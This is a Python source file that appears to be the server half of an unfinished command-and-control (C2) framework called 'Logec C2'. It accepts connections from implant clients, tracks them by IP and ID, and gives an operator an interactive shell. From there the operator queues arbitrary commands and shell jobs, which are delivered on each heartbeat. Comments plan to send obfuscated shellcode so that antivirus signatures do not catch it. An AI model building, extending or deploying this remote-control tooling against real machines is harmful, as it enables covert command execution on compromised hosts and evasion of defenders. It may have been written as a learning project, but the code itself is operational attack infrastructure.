import subprocess as sp
import socket
import threading
import time
import os
import random
import atexit

HEADER = 64
FORMAT = 'utf-8'

class s_sock:
    ##########
    ## Main Thread/Class
    ##########
    def socket_cleanup(self):
        #pass
        self.server.close()
    
    
    def start_server(self, ip, port):
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # this allows the socket to be reelased immediatly on crash/exit
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ADDR = (ip,port)
        self.server.bind(self.ADDR)  
        atexit.register(self.socket_cleanup)
        
        self.server.listen()  
        
        self.clients = {}
        self.current_clients = []
        
        
        ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
        while True:
            self.conn, addr = self.server.accept()
            ##print("\\|/New Connection\\|/")
            
            ## Getting client id from the client, and the IP address
            self.ip_address = self.conn.getpeername()[0]
            
            self.response = self.conn.recv(1024).decode().split("\\|/")
            
            response_list = []
            for i in self.response:
                response_list.append(i)
                        
            self.id = response_list[0]
            try:
                self.message = response_list[1]
            except:
                self.message = "none"
                print("list index out of range with self.message, setting to none")
            
            #message = "ok"
            #self.conn.send(message.encode())
            
            ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
            client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
            ## If the client hasn't been seen before, create new client ID n stuff
            if client_name not in self.current_clients:
                self.current_clients.append(client_name)
                
                ## creating object intance
                client = s_perclient()

                # something dict
                self.clients[client_name] = client
                
                ''' THis is what the dict looks like, each "name" is pointing at a class object
                clients = {
                    "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
                    "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
                    "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
                }
                '''

                globals()[client_name] = client
            
            else:
                print("client exists")
                pass
                ## strip client ID, and pass response along to the client class.
            
            ## starting thread for individual client, and listening for message coming back...
            ## which wont work as hot damn the server is also listening for conenctions
            
            ## TLDR, this is passing the ID, and Message recieved to the correct class & then that class handles it 
            thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))

            thread.start()  
    
    ## This is temporarily imitating logec code, will get reworked eventually
    def client_interact(self):
        ## This will be returned to the client later
        print(" ===== Logec C2 Manual Shell +++++\n\n")
        
        print("\n\n========Current Clients========")
        for var_name in globals():
            if var_name.startswith("client_"):
                print(var_name)
        print("===============================\n\n")
        
        
        ## dict 
        client_name = input("Enter a client name to interact, or 'refresh': ")

        # get the corresponding instance from the clients dictionary and call its method
        if client_name in self.clients:
            client_instance = self.clients[client_name]
            
            while True:
                client_instance.interact(input(f"Client (jobs for options): [{self.ip_address}]: "))
        
        elif client_name.lower() == "refresh":
            os.system("clear")
            self.client_interact()
            
        else:
            print(f"{client_name} not found.")
            

##########
## Per Client Class
##########

class s_perclient:
    def __init__(self):
        self.first_time = 0
        # setting current job to none to start
        self.current_job = None
    
    def handle_client(self, conn, addr, message, id):
        
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.port = addr[1]
        self.id =  id
        
        ## Sending message back to client that connection is ok
        #self.send_msg("ok")
        print(f"message: {message}")
    
        while message:
            #print(f"First Time {self.first_time}")
            
                # Receive/Listen for message from client
            #received_msg = conn.recv(1024).decode()   
            #print(received_msg)            
            
            ## Receiveing message from server portion & running through filters
            print("Call Decision Tree")
            self.decision_tree(message)
            
            ## setting message to none so this waits for a message b4 looping
            
            
            if not message:
                # Client has closed the connection, exit the loop

                print("Conn Closed\n\n")
                break
            
            message = None

            # Process the received message
            #self.decision_tree(received_msg)
            
        # Close the connection when the loop is over
        conn.close()
    
    def decision_tree(self, received_msg):
        print(f"decision tree called, message recieved: {received_msg}")
        
        print(f"MSG: {received_msg}, ID: {self.id}")
        
        if received_msg[0] == self.id:
            print(f"Recieved heartbeat from {self.ip}")
            ## check current_job, & send job ONLY on heartbeat
            
            if self.current_job != None:
                print(f"Sending Current Job: {self.current_job}")
                ## sending job
                self.send_msg(self.current_job)
                ## resetting values
                self.cleanup()
                print(f"Current Job on server side: {self.current_job}")
            
            else:
                print("No Current Job available, client will sleep\n\n")
    
    ## This part is what the user interacts with, and it sets self.current_job based on the decision. 
    
    ## Self.job executes/gets sent out when the client recieves a heartbeat
    def interact(self, user_input_raw):
        user_input = user_input_raw.lower()
        
        if user_input == "jobs":
            print("Jobs: \nShell [IP, Port] ")
            
        elif user_input == "run_command":
            command = input("Enter command: ")
            self.current_job = f"run_command\\|/{command}"
            #self.current_job = "wait"
            
        ## Idea for shell, have all the code on this side. That way, you just pass the string/command in, and 
        ## can have it obsfucated. The client will then execute said code. This may also help with signatures of common
        ## shells if embedded in the client code
        
        ## How it may work: Shell job gets sent, then the client listens for a followup string, which is the shellcode being sent
        elif user_input == "shell":
            self.current_job = "shell"
        
        elif user_input == "wait":
            self.current_job = "wait\\|/wait"
            
        elif user_input == "adjust_heartbeat":
            self.current_job = "adjust_heartbeat"
        
        elif user_input == "current_job":
            print(self.current_job.strip("\\|/"))
            
        elif user_input == "":
            print("No input provided!")
        
        else:
            self.current_job == "none"
            
    def cleanup(self):
        self.current_job = "wait\\|/"
        
    def send_msg(self, message):
        print(f"Message being sent: {message}")
        self.conn.send(message.encode())
        
        ## wasn't running as it was waiting for a response
        #recieve_msg = self.conn.recv(1024).decode()
        #return recieve_msg
    ## def send_cmd():
    ## this one will be for sending & receiving one off comamnds,
    ## seperate due to the recieve msg
        #recieve_msg = self.conn.recv(1024).decode()
        #return recieve_msg


    
    
if __name__ == "__main__":
    ## could listen on multiple ports with threading this whole thing
    SERV = s_sock()

    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',100))
    background_listen.start() 
    
    #SERV.start_server('0.0.0.0',8092)
    
    SERV.client_interact()